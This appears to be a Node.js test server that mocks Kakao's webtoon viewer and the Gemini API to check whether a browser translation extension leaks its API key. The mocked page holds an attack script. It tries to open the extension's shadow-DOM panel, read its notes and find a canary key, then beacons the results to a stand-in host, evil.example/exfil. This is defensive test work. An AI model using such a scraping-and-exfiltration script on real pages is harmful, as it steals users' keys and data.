// Local stand-in for Kakao and Google's Gemini API. It logs every request it receives,
// so the test can check exactly where an API key ends up.
const https = require("https");
const fs = require("fs");
const zlib = require("zlib");

const PORT = Number(process.env.PT_PORT || 8443);
const LOG = process.env.PT_LOG || __dirname + "/requests.jsonl";
fs.writeFileSync(LOG, "");

function crc32(buf) {
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let k = 0; k < 8; k++) crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function chunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const body = Buffer.concat([Buffer.from(type), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([len, body, crc]);
}

// A plain gray image, built by hand so the test needs no image library.
function solidPng(w, h) {
  const row = Buffer.alloc(1 + w * 3, 0xe8);
  row[0] = 0;
  const raw = Buffer.concat(Array(h).fill(row));
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    chunk("IHDR", ihdr),
    chunk("IDAT", zlib.deflateSync(raw)),
    chunk("IEND", Buffer.alloc(0))
  ]);
}

// The page plays a hostile Kakao page: it loads a bait image from another host and,
// after the extension has started, tries to read the extension's panel and the key.
const NEEDLE_PARTS = '"CANARY" + "-SECRET"';
const PAGE = `<!doctype html><html><body style="margin:0;background:#111">
<img src="/img/1.png" width="630"><img src="/img/2.png" width="630">
<img src="https://evil.example/bait.png" width="630">
<script>
const NEEDLE = ${NEEDLE_PARTS};
setTimeout(() => {
  const h = document.getElementById("kt-ui-host");
  try { h.shadowRoot.getElementById("fab").click(); } catch (e) {}
  setTimeout(() => {
    const r = {};
    r.hostFound = !!h;
    r.shadowReadable = !!(h && h.shadowRoot);
    try { r.notesRead = h.shadowRoot.getElementById("notes").value; } catch (e) { r.notesRead = null; }
    r.chromeRuntime = typeof (window.chrome && window.chrome.runtime && window.chrome.runtime.sendMessage);
    r.keyInDom = document.documentElement.outerHTML.includes(NEEDLE);
    try { r.keyInWindow = Object.keys(window).some((k) => { try { return String(window[k]).includes(NEEDLE); } catch (e) { return false; } }); } catch (e) {}
    navigator.sendBeacon("https://evil.example/exfil", JSON.stringify(r));
  }, 1200);
}, 15000);
</script></body></html>`;

const png = solidPng(630, 1000);

https
  .createServer({ key: fs.readFileSync(__dirname + "/key.pem"), cert: fs.readFileSync(__dirname + "/cert.pem") }, (req, res) => {
    const chunks = [];
    req.on("data", (d) => chunks.push(d));
    req.on("end", () => {
      const body = Buffer.concat(chunks);
      const host = (req.headers.host || "").split(":")[0];
      fs.appendFileSync(
        LOG,
        JSON.stringify({ t: Date.now(), host, method: req.method, url: req.url, headers: req.headers, bodyLen: body.length, body: body.toString("utf8", 0, 600) }) + "\n"
      );
      if (host === "generativelanguage.googleapis.com") {
        const boxes = [{ box_2d: [100, 100, 300, 600], original: "test", translation: "Hello there", bg: "#ffffff", fg: "#111111" }];
        res.writeHead(200, { "content-type": "application/json", "access-control-allow-origin": "*" });
        return res.end(JSON.stringify({ candidates: [{ content: { parts: [{ text: JSON.stringify(boxes) }] } }] }));
      }
      if (host === "webtoon.kakao.com" && req.url.startsWith("/viewer")) {
        res.writeHead(200, { "content-type": "text/html" });
        return res.end(PAGE);
      }
      if (req.url.startsWith("/exfil")) {
        res.writeHead(204);
        return res.end();
      }
      res.writeHead(200, { "content-type": "image/png" });
      res.end(png);
    });
  })
  .listen(PORT, () => console.log("test server listening on " + PORT));
